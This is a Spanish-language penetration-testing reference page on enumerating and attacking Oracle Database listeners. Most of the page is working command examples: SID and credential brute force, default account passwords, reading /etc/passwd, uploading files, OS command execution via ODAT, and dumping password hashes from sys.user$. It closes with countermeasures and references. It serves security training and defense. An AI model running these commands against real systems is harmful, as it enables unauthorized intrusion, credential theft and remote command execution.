# Enumeración Oracle Database

## Descripción
Oracle Database es un sistema de gestión de bases de datos relacional empresarial que opera en el puerto 1521/tcp (TNS Listener). La enumeración de Oracle incluye: identificar la versión del TNS Listener y sus componentes, descubrir SIDs (System Identifiers) e instancias de la base de datos, realizar fuerza bruta de credenciales (especialmente cuentas por defecto como SYS, SYSTEM, SCOTT, DBSNMP), y con acceso, extraer hashes de contraseñas, tablas y datos sensibles. Oracle tiene una superficie de ataque amplia debido a sus cuentas por defecto, procedimientos PL/SQL con privilegios elevados, y la posibilidad de ejecutar comandos del sistema operativo a través de Java o paquetes como DBMS_SCHEDULER.

## Clasificación
- **Fase**: Enumeración
- **MITRE ATT&CK**: T1046 (Network Service Discovery) — descubrimiento del servicio; T1110 (Brute Force) — fuerza bruta de credenciales
- **Plataforma**: Multi
- **Dificultad**: Intermedia

## Herramientas
- **nmap** (`oracle-tns-version`, `oracle-sid-brute`, `oracle-brute`, `oracle-enum-users`) — enumeración vía NSE
- **odat** (Oracle Database Attacking Tool) — herramienta integral para enumeración y ataque de Oracle
- **tnscmd10g** — interacción directa con el TNS Listener (versión, status, SIDs)
- **Metasploit** (`tns_version`, `sid_brute`, `login`) — enumeración y fuerza bruta
- **sqlplus** — cliente nativo de Oracle para conexión directa y consultas SQL
- **Hydra** — fuerza bruta de credenciales Oracle

## Comandos / Ejemplos

### Enumeración con Nmap NSE
```bash
# Detectar version del TNS Listener
nmap -sV -p 1521 <target>

# Obtener version detallada del TNS Listener
nmap -p 1521 --script oracle-tns-version <target>

# Fuerza bruta de SIDs (descubrir instancias de base de datos)
nmap -p 1521 --script oracle-sid-brute <target>
# Resultado: SIDs encontrados como XE, ORCL, PROD, etc.

# Fuerza bruta de credenciales Oracle
nmap -p 1521 --script oracle-brute \
  --script-args 'oracle-brute.sid=XE' <target>

# Enumeracion de usuarios (requiere credenciales)
nmap -p 1521 --script oracle-enum-users \
  --script-args 'oracle-enum-users.sid=XE,userdb=users.txt' <target>
```

### Interacción con TNS Listener vía tnscmd10g
```bash
# Obtener version del TNS Listener
tnscmd10g version -h <target> -p 1521

# Obtener status del listener (puede revelar OS, hostname, instancias)
tnscmd10g status -h <target> -p 1521
# Resultado: version de Oracle, plataforma (Linux/Windows), instancias registradas,
#            rutas del sistema de archivos, uptime

# Obtener servicios registrados
tnscmd10g services -h <target> -p 1521
```

### Enumeración con ODAT (Oracle Database Attacking Tool)
```bash
# Obtener toda la información disponible del listener
odat tnscmd -s <target> -p 1521 --version
odat tnscmd -s <target> -p 1521 --status

# Descubrir SIDs válidos
odat sidguesser -s <target> -p 1521
# Usa diccionario interno de SIDs comunes (XE, ORCL, PROD, DEV, TEST, etc.)

# Fuerza bruta de credenciales para un SID conocido
odat passwordguesser -s <target> -p 1521 -d XE \
  --accounts-file /usr/share/odat/accounts/accounts_multiple.txt

# Verificar todos los modulos disponibles con credenciales validas
odat all -s <target> -p 1521 -d XE -U scott -P tiger

# Lectura de archivos del SO (si el usuario tiene privilegios)
odat ctxsys -s <target> -p 1521 -d XE -U scott -P tiger \
  --getFile /etc/passwd

# Subida de archivos al servidor
odat dbmsadvisor -s <target> -p 1521 -d XE -U scott -P tiger \
  --putFile /tmp shell.txt /ruta/local/shell.txt

# Ejecución de comandos del SO
odat externaltable -s <target> -p 1521 -d XE -U scott -P tiger \
  --exec /bin/bash "id"

# Ejecución de comandos vía Java (requiere privilegios CREATE PROCEDURE + Java)
odat java -s <target> -p 1521 -d XE -U scott -P tiger \
  --exec "whoami"
```

### Enumeración con Metasploit
```bash
# Detectar version del TNS Listener
use auxiliary/scanner/oracle/tns_version
set RHOSTS <target>
run

# Fuerza bruta de SIDs
use auxiliary/scanner/oracle/sid_brute
set RHOSTS <target>
run
# Resultado: SIDs válidos encontrados

# Fuerza bruta de credenciales
use auxiliary/scanner/oracle/oracle_login
set RHOSTS <target>
set SID XE
run
# Prueba cuentas por defecto: SYS/change_on_install, SYSTEM/manager,
#                              SCOTT/tiger, DBSNMP/dbsnmp
```

### Conexión directa con sqlplus
```bash
# Conectar como usuario normal
sqlplus scott/tiger@<target>:1521/XE

# Conectar como SYSDBA (máximo privilegio)
sqlplus sys/password@<target>:1521/XE as sysdba

# Consultas de enumeración dentro de Oracle:
SELECT * FROM v$version;                          -- version de Oracle
SELECT username FROM all_users;                    -- usuarios de la BD
SELECT username, account_status FROM dba_users;    -- estado de cuentas
SELECT name, password FROM sys.user$;              -- hashes de contraseñas
SELECT table_name FROM all_tables WHERE owner='HR'; -- tablas de un esquema
SELECT * FROM dba_role_privs WHERE grantee='SCOTT'; -- roles asignados
SELECT * FROM session_privs;                        -- privilegios de sesion actual
```

**Cuentas por defecto comunes:**
| Usuario | Contraseña por defecto | Rol |
|---------|----------------------|-----|
| SYS | change_on_install | SYSDBA |
| SYSTEM | manager | DBA |
| SCOTT | tiger | Usuario demo |
| DBSNMP | dbsnmp | Monitoreo |
| HR | hr | Esquema demo |

## Contramedidas
- Cambiar las contraseñas de todas las cuentas por defecto y bloquear las que no se usen (LOCK)
- Configurar el TNS Listener con password y restringir los comandos de administración remota
- No exponer el puerto 1521 a internet; restringirlo a IPs de aplicación autorizadas
- Revocar privilegios innecesarios: CREATE PROCEDURE, CREATE LIBRARY, Java permissions
- Deshabilitar DBMS_SCHEDULER y paquetes de ejecución de comandos si no son necesarios
- Aplicar principio de mínimo privilegio: no usar cuentas con rol DBA para aplicaciones
- Mantener Oracle Database actualizado con los últimos Critical Patch Updates (CPU)
- Configurar Oracle Audit Vault o activar auditing para monitorear accesos sospechosos

## Referencias
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking: The Ethical Hacker's Handbook* (5th ed.). McGraw-Hill Education.
- MITRE Corporation. (2024). ATT&CK Technique T1046: Network Service Discovery. https://attack.mitre.org/techniques/T1046/
- MITRE Corporation. (2024). ATT&CK Technique T1110: Brute Force. https://attack.mitre.org/techniques/T1110/
